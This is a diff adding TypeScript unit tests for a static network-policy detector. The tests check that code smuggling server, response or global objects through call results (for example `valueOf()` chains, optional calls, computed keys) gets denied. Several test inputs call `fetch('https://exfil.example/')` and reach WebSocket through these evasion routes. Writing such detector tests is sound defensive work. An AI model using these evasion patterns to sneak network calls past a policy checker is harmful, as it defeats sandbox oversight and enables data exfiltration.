@@ -568,6 +568,201 @@ describe('D3 network policy fixpoint is explicit, bounded and fail-closed', () =
 });
 
 // ---------------------------------------------------------------------------
+// Receiver-call result authority inheritance (PR #67 F2 / F3)
+// ---------------------------------------------------------------------------
+
+describe('D3 network policy receiver-call result authority inheritance (PR #67 F2/F3)', () => {
+  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
+  const inListener = (body: string): string => `${NS}\nhttp.createServer((request, response) => {\n  ${body}\n});`;
+
+  const factsOfConst = (source: string, name: string): { facts: readonly string[]; result: NetworkPolicyResult; bound: number } => {
+    const inspection = inspectNetworkPolicy(source);
+    const declaration = collectNodes(inspection.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === name);
+    const symbol = declaration === undefined ? undefined : inspection.valueSymbolOf(declaration.name);
+    if (symbol === undefined) throw new Error(`no const ${name}`);
+    return { facts: inspection.factsOf(symbol), result: inspection.result, bound: inspection.fixpointBound };
+  };
+
+  it('F2: denies every proven-target call-result witness through the existing target policy', () => {
+    for (const [source, reason] of [
+      [withServer(`export const leaked = server.listen(4317, '127.0.0.1');`), 'SERVER_EXPORT'],
+      [withServer(`server.listen(1).on('connection', (socket) => { socket.write('x'); });`), 'SERVER_MEMBER'],
+      [withServer(`server.close().on('close', () => {});`), 'SERVER_MEMBER'],
+      [inListener(`response.setHeader('a', 'b').socket;`), 'RESPONSE_MEMBER'],
+      [inListener(`response.end('x').socket;`), 'RESPONSE_MEMBER'],
+      [inListener(`const r2 = response.setHeader('a', 'b');\nuse(r2);`), 'RESPONSE_ESCAPE'],
+      [withServer(`use(server.listen(1));`), 'SERVER_ESCAPE'],
+      [`${NS}\nhttp.createServer(${L}).listen(1).on('x', () => {});`, 'SERVER_MEMBER'],
+      [withServer(`const leaked = server.listen(1);\nuse(leaked);`), 'SERVER_ESCAPE'],
+    ] as const) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.verdict, source).toBe('DENY');
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
+      expect(result.fixpoint.state, source).toBe('CONVERGED');
+    }
+  });
+
+  it('F3: denies every global-root call-result witness through the existing global-receiver rules', () => {
+    for (const [source, reason] of [
+      [`globalThis.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`globalThis.global.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`const g = globalThis.valueOf();`, 'GLOBAL_RECEIVER_ESCAPE'],
+      [`window['valueOf']().WebSocket;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`use(self.valueOf());`, 'GLOBAL_RECEIVER_ESCAPE'],
+    ] as const) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.verdict, source).toBe('DENY');
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
+    }
+  });
+
+  it('F3: follows optional calls of permitted global members exactly like plain calls, with one finding each', () => {
+    for (const [source, reason] of [
+      [`globalThis.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`globalThis?.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`globalThis?.valueOf().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`globalThis['valueOf']?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`globalThis['valueOf']?.().WebSocket;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`(globalThis.valueOf?.() as any).fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`globalThis.valueOf?.().self.fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
+      [`const g = globalThis.valueOf?.();`, 'GLOBAL_RECEIVER_ESCAPE'],
+      [`use(globalThis.valueOf?.());`, 'GLOBAL_RECEIVER_ESCAPE'],
+      [`function g() { return window.valueOf?.(); }`, 'GLOBAL_RECEIVER_ESCAPE'],
+      [`declare const k: string;\nglobalThis.valueOf?.()[k];`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
+      [`declare const k: string;\nglobalThis[k]?.().fetch('x');`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
+    ] as const) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.verdict, source).toBe('DENY');
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
+      expect(result.findings, `${source}\n${describeFindings(result)}`).toHaveLength(1);
+    }
+    for (const source of [
+      `globalThis.valueOf?.();`,
+      `void globalThis.valueOf?.();`,
+      `typeof globalThis.valueOf?.();`,
+      `globalThis.valueOf?.().console.log('x');`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
+    }
+  });
+
+  it('preserves allowed chains, statement-position results and eligible propagation', () => {
+    for (const source of [
+      withServer(`server.listen(1).close();`),
+      inListener(`response.setHeader('a', 'b').end('x');`),
+      withServer(`void server.listen(1);`),
+      withServer(`server.listen(4317, '127.0.0.1', () => { console.log('up'); });`),
+      withServer(`function setup(s: http.Server) { s.close(); }\nsetup(server.listen(1));`),
+      withServer(`const started = server.listen(1);\nstarted.close();`),
+      `globalThis.console.log('x');`,
+      `globalThis.valueOf();`,
+      `globalThis.valueOf().console.log('x');`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
+      expect(result.verdict, source).toBe('ALLOW');
+    }
+  });
+
+  it('establishes SERVER authority on a const alias of a listen result as ALIAS, converging within the derived bound', () => {
+    const rooted = factsOfConst(withServer(`const leaked = server.listen(1);\nleaked.close();`), 'leaked');
+    expect(rooted.facts).toEqual(['SERVER:ALIAS']);
+    expect(rooted.result.fixpoint.state).toBe('CONVERGED');
+    expect(rooted.result.fixpoint.iterations).toBeLessThanOrEqual(rooted.bound);
+    expect(rooted.result.fixpoint.bound).toBe(rooted.bound);
+    expect(rooted.result.verdict, describeFindings(rooted.result)).toBe('ALLOW');
+
+    const direct = factsOfConst(`${NS}\nconst leaked = http.createServer(${L}).listen(1);\nleaked.close();`, 'leaked');
+    expect(direct.facts).toEqual(['SERVER:ALIAS']);
+    expect(direct.result.fixpoint.state).toBe('CONVERGED');
+
+    const chained = factsOfConst(withServer(`const a = server.listen(1);\nconst b = a.close();\nb.close();`), 'b');
+    expect(chained.facts).toEqual(['SERVER:ALIAS']);
+    expect(chained.result.fixpoint.state).toBe('CONVERGED');
+    expect(chained.result.fixpoint.iterations).toBeLessThanOrEqual(chained.bound);
+
+    const viaParam = factsOfConst(withServer(`function setup(s: http.Server) { const t = s.listen(1); t.close(); }\nsetup(server);`), 't');
+    expect(viaParam.facts).toEqual(['SERVER:PARAM']);
+    expect(viaParam.result.fixpoint.state).toBe('CONVERGED');
+
+    const response = factsOfConst(inListener(`const r2 = response.setHeader('a', 'b');\nr2.end();`), 'r2');
+    expect(response.facts).toEqual(['RESPONSE:ALIAS']);
+  });
+
+  it('does not let optional calls enter the direct-call rule: the existing member policy already denies them', () => {
+    const optionalCall = inspectNetworkPolicy(withServer(`const x = server.listen?.(1);\nuse(x);`));
+    const declaration = collectNodes(optionalCall.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === 'x');
+    const symbol = declaration === undefined ? undefined : optionalCall.valueSymbolOf(declaration.name);
+    expect(symbol && optionalCall.factsOf(symbol)).toEqual([]);
+    expect(optionalCall.result.reasons).toEqual(['SERVER_MEMBER']);
+    for (const [source, reason] of [
+      [withServer(`server.listen?.(1).on('x', () => {});`), 'SERVER_MEMBER'],
+      [withServer(`server?.listen(1).on('x', () => {});`), 'SERVER_MEMBER'],
+      [inListener(`response.end?.('x').socket;`), 'RESPONSE_MEMBER'],
+    ] as const) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, source).toEqual([reason]);
+      expect(result.findings, source).toHaveLength(1);
+    }
+  });
+
+  it('keeps computed/indeterminate keys on their existing verdicts without a second finding', () => {
+    const server = analyzeNetworkPolicy(withServer(`declare const k: string;\nserver[k]().on('x', () => {});`));
+    expect(server.reasons).toEqual(['SERVER_MEMBER']);
+    expect(server.findings).toHaveLength(1);
+    const global = analyzeNetworkPolicy(`declare const k: string;\nglobalThis[k]().fetch('x');`);
+    expect(global.reasons).toEqual(['GLOBAL_RECEIVER_RUNTIME_KEY']);
+    expect(global.findings).toHaveLength(1);
+    const overLong = analyzeNetworkPolicy(withServer(`server['listenButMuchLongerThanAnyPolicyName']().on('x', () => {});`));
+    expect(overLong.reasons).toEqual(['SERVER_MEMBER']);
+    expect(overLong.findings).toHaveLength(1);
+  });
+
+  it('gives user-defined methods no authority unless their receiver already carries it', () => {
+    for (const source of [
+      withServer(`const o = { listen: () => ({ on: (x: string) => x }) };\no.listen().on('x');\nserver.close();`),
+      inListener(`const box = { end: () => ({ socket: 1 }) };\nbox.end().socket;\nresponse.end();`),
+      `const self = { valueOf: () => ({ fetch: 1 }) };\nconst v = self.valueOf();\nv.fetch;`,
+      `${NS}\nfunction other(request: any, response: any) { request.url().socket; response.end().socket; }`,
+    ]) {
+      const result = analyzeNetworkPolicy(source);
+      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
+    }
+    const carried = analyzeNetworkPolicy(withServer(`function setup(s: http.Server) { s.listen(1).on('x', () => {}); }\nsetup(server);`));
+    expect(carried.reasons).toEqual(['SERVER_MEMBER']);
+  });
+
+  it('leaves the existing escape rules effective', () => {
+    for (const [source, reason] of [
+      [withServer(`use(server);`), 'SERVER_ESCAPE'],
+      [inListener(`const box = { request };`), 'REQUEST_ESCAPE'],
+      [inListener(`use(response);`), 'RESPONSE_ESCAPE'],
+      [`const g = globalThis;`, 'GLOBAL_RECEIVER_ESCAPE'],
+      [`use(self);`, 'GLOBAL_RECEIVER_ESCAPE'],
+    ] as const) {
+      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([reason]);
+    }
+  });
+
+  it('is structural: one expression-authority lookup, no member-name special cases', () => {
+    const detector = readFileSync(detectorPath, 'utf8');
+    expect(occurrences(detector, 'function expressionFacts(')).toBe(1);
+    expect(occurrences(detector, 'function inheritingReceiverOf(')).toBe(1);
+    expect(occurrences(detector, 'function classesOf(')).toBe(1);
+    expect(occurrences(detector, 'factsOf(ctx, valueSymbolOf(')).toBe(1);
+    // The optional-call follow is confined to the global-receiver path; target classes keep the direct-call predicate.
+    expect(occurrences(detector, 'const memberCallOf = ')).toBe(1);
+    expect(occurrences(detector, 'memberCallOf(parent)')).toBe(1);
+    expect(occurrences(detector, 'inheritingReceiverOf(ctx, ')).toBe(1);
+    for (const forbidden of ['valueOf', 'toString', 'EventSource', 'receiverPreserving', 'RETURNS_THIS']) {
+      expect(occurrences(detector, forbidden), forbidden).toBe(0);
+    }
+    expect(POLICY_KEY_NAMES).not.toContain('valueOf');
+  });
+});
+
+// ---------------------------------------------------------------------------
 // Real host
 // ---------------------------------------------------------------------------
 
